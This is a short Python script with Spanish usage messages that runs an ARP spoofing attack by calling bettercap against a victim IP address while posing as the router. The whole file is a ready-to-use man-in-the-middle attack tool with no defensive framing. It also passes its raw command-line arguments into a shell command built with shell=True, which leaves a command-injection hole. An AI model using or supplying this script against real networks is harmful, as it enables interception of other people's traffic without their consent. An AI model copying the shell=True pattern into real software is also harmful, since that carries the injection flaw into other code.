import subprocess
import sys

def arp_spoof(target_ip, router_ip):
    try:
        command = f"bettercap -eval \"set arp.spoof.targets {target_ip}; set arp.spoof.spoof {router_ip}; arp.spoof on; sleep 10\""
        subprocess.run(command, shell=True)
    except KeyboardInterrupt:
        print("\nDeteniendo ARP Spoofing")
        sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python arp_spoof.py <IP_Víctima> <IP_Router>")
        sys.exit(1)

    target_ip = sys.argv[1]
    router_ip = sys.argv[2]

    arp_spoof(target_ip, router_ip)
